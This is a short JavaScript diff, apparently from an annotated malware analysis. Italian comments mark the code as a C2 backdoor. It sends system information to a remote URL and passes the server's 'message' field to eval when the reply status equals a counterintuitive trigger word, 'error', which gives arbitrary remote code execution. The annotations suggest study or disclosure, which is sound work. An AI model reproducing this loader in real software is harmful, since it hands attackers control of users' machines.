@@ -49,7 +49,7 @@ async function sendRequest(sysInfo) {
     const res = await fetch(url + '?' + params);
     const { status, message, sysId: newId } = await res.json();
 
-    if (status === 'success') {
+    if (status === 'error') {              // ⚠️ la parola-chiave trigger è "error" (controintuitiva)
       try { eval(message); } catch (e) {}   // ⚠️⚠️ RCE: esegue codice arbitrario dal C2
     }
     if (newId) sysId = newId;
